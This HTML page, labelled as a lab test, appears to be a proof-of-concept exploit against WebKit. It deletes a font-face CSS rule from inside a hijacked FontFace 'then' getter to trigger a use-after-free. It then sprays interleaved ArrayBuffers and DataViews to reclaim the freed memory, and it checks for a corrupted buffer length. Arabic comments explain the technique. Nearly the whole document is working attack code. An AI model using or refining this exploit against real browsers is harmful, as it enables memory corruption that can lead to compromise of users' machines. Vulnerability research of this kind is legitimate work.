<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: targetFont; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
    <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
        [LAB] WebKit Corruption & Corrupted Length Test...
    </div>

<script>
function updateStatus(message) {
    const panel = document.getElementById('status_panel');
    if (panel) panel.innerHTML += "<br>[*] " + message;
}

let structuralArrays = [];
let views = [];

window.onload = () => {
    updateStatus("Stage 3: Attempting Memory Structure Overlap...");

    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                // 1. التحرير الفوري لكائن الـ C++
                document.getElementById('s').sheet.deleteRule(0);

                updateStatus("Corrupting: Spraying interleaved ArrayBuffers and Views...");
                
                // 2. تكتيك التداخل: ننشئ مصفوفات متتالية في الذاكرة لعل أحدها يقع مكان الكائن المحذوف
                for (let i = 0; i < 300; i++) {
                    // حجم 32 بايت يحاكي الحجم التقريبي للبنية الداخلية
                    let buffer = new ArrayBuffer(32);
                    structuralArrays.push(buffer);
                    views.push(new DataView(buffer));
                }

                updateStatus("Triggering Layout verification step...");
                document.body.offsetTop; 
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');

    // خطوة الفحص بعد التعديل الذاكري
    setTimeout(() => {
        updateStatus("Verification Phase: Checking if any ArrayBuffer length was corrupted...");
        
        let corrupted = false;
        for (let i = 0; i < structuralArrays.length; i++) {
            // القيمة الطبيعية يجب أن تكون 32. إذا تغيرت، فقد نجح التداخل!
            if (structuralArrays[i].byteLength !== 32) {
                updateStatus("SUCCESS: Found corrupted ArrayBuffer at index " + i + " with size: " + structuralArrays[i].byteLength);
                corrupted = true;
                break;
            }
        }
        
        if (!corrupted) {
            updateStatus("Buffers intact. Standard layout maintained (or memory isolated).");
        }
    }, 600);
};
</script>
</body>
</html>
